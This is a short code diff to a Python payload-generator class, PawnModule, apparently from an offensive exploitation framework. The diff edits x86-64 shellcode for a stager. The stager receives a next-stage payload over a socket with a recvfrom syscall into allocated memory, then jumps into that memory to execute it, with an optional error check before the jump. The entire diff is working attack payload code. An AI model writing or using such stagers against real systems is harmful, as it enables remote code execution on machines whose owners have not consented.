@@ -85,16 +85,17 @@ class PawnModule(Module, Socket, Assembler):
 
                 /*
                  * Read phase to allocated memory space
-                 * read(rdi, rsi, length)
+                 * recvfrom(rdi, rsi, length, MSG_WAITALL, NULL, 0)
                  */
 
+                push 0x2d
+                pop rax
                 pop rsi
-                push 0x{length.to_bytes(8, 'little').hex()}
+                push {'0x%08x' % length}
                 pop rdx
+                push 0x100
+                pop r10
                 syscall
-
-                /* Down the rabbit hole! */
-                jmp rsi
         """)
 
         if reliable:
@@ -102,6 +103,11 @@ class PawnModule(Module, Socket, Assembler):
                     test rax, rax
                     js fail
             """)
+
+        payload += dedent("""\
+                /* Jump to the next phase */
+                jmp rsi
+        """)
 
         if reliable:
             payload += dedent("""\
